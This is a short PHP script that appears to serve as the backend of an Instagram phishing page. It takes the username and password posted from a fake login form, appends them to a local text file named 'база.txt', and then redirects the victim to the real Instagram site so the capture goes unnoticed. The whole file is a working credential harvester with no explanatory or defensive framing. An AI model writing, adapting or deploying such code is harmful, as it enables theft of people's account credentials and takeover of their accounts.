<?php

$username = $_POST['username'];
$password = $_POST['password'];

$fp = fopen('база.txt', 'a+');
fwrite($fp, 'Username: ' . $username . "\n");
fwrite($fp, 'Password: ' . $password . "\n");
fwrite($fp, '--------- ' . "\n");
fclose($fp);

header('location: https://www.instagram.com/');